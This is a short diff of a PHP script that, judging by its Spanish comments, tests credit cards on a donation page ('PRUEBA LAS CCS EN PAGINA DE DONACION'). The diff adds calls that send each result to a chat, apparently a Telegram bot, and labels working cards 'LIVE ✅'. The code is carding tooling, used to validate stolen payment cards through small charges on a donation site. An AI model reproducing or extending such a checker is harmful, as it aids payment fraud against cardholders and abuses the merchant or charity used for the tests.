@@ -110,7 +110,7 @@ $token = $json["id"];
 $ip = $json["client_ip"];
 curl_close($curl);
 //echo "$token\n";
-
+sendMessage($chatId, $response, "HTML");  // Enviar el mensaje
 //---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
 $curl = curl_init();
 
@@ -169,7 +169,8 @@ if (isset($json['status'])) {
 }
 
 curl_close($curl);
-
+sendMessage($chatId, $respo, "HTML");  // Enviar el mensaje
+	
 $timetakeen = (microtime(true) - $startTime);
 $time = substr_replace($timetakeen, '', 4);
 $proxy = "LIVE ✅";
